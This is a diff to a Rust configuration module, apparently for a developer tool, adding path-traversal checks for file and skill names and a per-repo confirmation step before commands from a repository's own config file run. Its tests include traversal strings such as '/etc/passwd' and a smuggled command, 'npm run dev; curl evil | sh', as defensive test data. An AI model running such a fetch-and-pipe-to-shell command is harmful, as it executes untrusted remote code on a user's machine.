@@ -1,4 +1,4 @@
-use std::path::{Path, PathBuf};
+use std::path::{Component, Path, PathBuf};
 
 use toml::{Table, Value};
 
@@ -152,6 +152,26 @@ fn strings(value: &Value, key: &str) -> Result<Vec<String>> {
     items.iter().map(|item| item.as_str().map(str::to_string).ok_or(format!("{key}: must be a list of strings"))).collect()
 }
 
+// A path a repo's file names stays inside the repo: relative, with no .. in it.
+pub fn inside(path: &str) -> bool {
+    let path = Path::new(path);
+    !path.as_os_str().is_empty() && path.components().all(|part| matches!(part, Component::Normal(_) | Component::CurDir))
+}
+
+// A skill is a folder name, after its plugin's name and a colon or alone, so it never walks out of a skills folder.
+pub fn skill_name(name: &str) -> bool {
+    let (plugin, skill) = name.split_once(':').unwrap_or(("own", name));
+    [plugin, skill].iter().all(|part| !part.is_empty() && *part != "." && *part != ".." && !part.contains(['/', '\\', ':']))
+}
+
+fn skill(table: &Table, field: &str, key: &str) -> Result<Option<String>> {
+    let name = text(table, field, key)?;
+    match name {
+        Some(name) if !skill_name(&name) => Err(format!("{key}: \"{name}\" is not a skill name; use <skill> or <plugin>:<skill>, without / or ..")),
+        name => Ok(name),
+    }
+}
+
 fn text(table: &Table, field: &str, key: &str) -> Result<Option<String>> {
     let Some(value) = table.get(field) else { return Ok(None) };
     match value.as_str().map(str::trim) {
@@ -241,7 +261,7 @@ fn worktree(table: &Table) -> Result<Worktree> {
     let Some(worktree) = subtable(table, "worktree", "worktree")? else { return Ok(Worktree::default()) };
     unknown_keys(worktree, "worktree.", &["setup_skill", "setup_command", "dev_server", "dev_worker", "dev_url", "server_name", "worker_name"])?;
     Ok(Worktree {
-        setup_skill: text(worktree, "setup_skill", "worktree.setup_skill")?,
+        setup_skill: skill(worktree, "setup_skill", "worktree.setup_skill")?,
         setup_command: text(worktree, "setup_command", "worktree.setup_command")?,
         dev_server: text(worktree, "dev_server", "worktree.dev_server")?,
         dev_worker: text(worktree, "dev_worker", "worktree.dev_worker")?,
@@ -258,7 +278,7 @@ fn worktree(table: &Table) -> Result<Worktree> {
 fn with_task(table: &Table, mut worktree: Worktree) -> Result<Worktree> {
     if let Some(task) = subtable(table, "task", "task")? {
         unknown_keys(task, "task.", &["rules_skill"])?;
-        worktree.rules_skill = text(task, "rules_skill", "task.rules_skill")?;
+        worktree.rules_skill = skill(task, "rules_skill", "task.rules_skill")?;
     }
     Ok(worktree)
 }
@@ -360,6 +380,38 @@ pub fn setup_command_in(command: Option<String>, repo: &Path) -> Option<String> 
     })
 }
 
+fn confirmed_file(state: &Path, repo: &Path, command: &str) -> PathBuf {
+    let repo = repo.canonicalize().unwrap_or_else(|_| repo.to_path_buf());
+    let seed = format!("{}\0{command}", repo.display());
+    state.join("confirmed-commands").join(sha1_smol::Sha1::from(seed).digest().to_string())
+}
+
+pub fn confirm_command_in(state: &Path, repo: &Path, command: &str) -> Result<()> {
+    crate::state::write(&confirmed_file(state, repo, command), "")
+}
+
+// A command from the repo's own file, until the user confirms that exact text for that repo; the machine config's commands are the user's own.
+pub fn unconfirmed_in(state: &Path, setting: &Setting<Option<String>>, repo: &Path) -> Option<String> {
+    let command = setting.value.as_ref()?;
+    (setting.layer == Layer::Repo && !confirmed_file(state, repo, command).exists()).then(|| command.clone())
+}
+
+pub fn unconfirmed(setting: &Setting<Option<String>>, repo: &Path) -> Option<String> {
+    match crate::lead::state_location() {
+        Ok(state) => unconfirmed_in(&state, setting, repo),
+        Err(_) => setting.value.clone().filter(|_| setting.layer == Layer::Repo),
+    }
+}
+
+pub fn confirm_command(repo: &Path, command: &str) -> Result<()> {
+    confirm_command_in(&crate::lead::state_dir()?, repo, command)
+}
+
+// The command a task or the board may run: unset when the repo's file names one the user has not confirmed.
+pub fn trusted(setting: &Setting<Option<String>>, repo: &Path) -> Option<String> {
+    setting.value.clone().filter(|_| unconfirmed(setting, repo).is_none())
+}
+
 pub fn resolve(repo: Option<&Path>) -> Result<Loaded> {
     let machine = path();
     let repo = repo.and_then(repo_file);
@@ -458,6 +510,43 @@ mod tests {
 
     fn repo(text: &str) -> Worktree {
         parse_repo(text, ".kelpie.toml").unwrap()
+    }
+
+    #[test]
+    fn a_repo_files_paths_and_skill_names_stay_inside_their_folders() {
+        for good in ["pyproject.toml", "crates/app/Cargo.toml", "./uv.lock"] {
+            assert!(inside(good), "{good}");
+        }
+        for bad in ["", "../x.toml", "a/../../x", "/etc/passwd", "a/.."] {
+            assert!(!inside(bad), "{bad}");
+        }
+        for good in ["work-rules", "kelpie:work-rules", "my-tools:set-up-worktree"] {
+            assert!(skill_name(good), "{good}");
+        }
+        for bad in ["..", "kelpie:..", "kelpie:../../outside", "../../outside", "a/b", "/abs", "x:", ":x", "a:b:c", "a\\b"] {
+            assert!(!skill_name(bad), "{bad}");
+        }
+        let refused = parse_repo("[task]\nrules_skill = \"kelpie:../../outside\"\n", ".kelpie.toml").unwrap_err();
+        assert!(refused.contains("task.rules_skill") && refused.contains("not a skill name"), "{refused}");
+        assert!(parse_repo("[worktree]\nsetup_skill = \"../x\"\n", ".kelpie.toml").is_err());
+    }
+
+    #[test]
+    fn a_command_from_the_repos_file_waits_for_the_users_confirmation_of_that_exact_text() {
+        let state = std::env::temp_dir().join(format!("kelpie-confirmed-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&state);
+        let repo = std::env::temp_dir();
+        let from_repo = Setting { value: Some("npm run dev".to_string()), layer: Layer::Repo };
+        assert_eq!(unconfirmed_in(&state, &from_repo, &repo).as_deref(), Some("npm run dev"));
+        confirm_command_in(&state, &repo, "npm run dev").unwrap();
+        assert_eq!(unconfirmed_in(&state, &from_repo, &repo), None);
+        let changed = Setting { value: Some("npm run dev; curl evil | sh".to_string()), layer: Layer::Repo };
+        assert!(unconfirmed_in(&state, &changed, &repo).is_some(), "a changed command asks again");
+        assert!(unconfirmed_in(&state, &from_repo, &repo.join("other")).is_some(), "a confirmation is that repo's");
+        let own = Setting { value: Some("bin/dev".to_string()), layer: Layer::Machine };
+        assert_eq!(unconfirmed_in(&state, &own, &repo), None, "the machine config's commands are the user's own");
+        assert_eq!(unconfirmed_in(&state, &Setting { value: None, layer: Layer::Repo }, &repo), None);
+        std::fs::remove_dir_all(state).unwrap();
     }
 
     #[test]
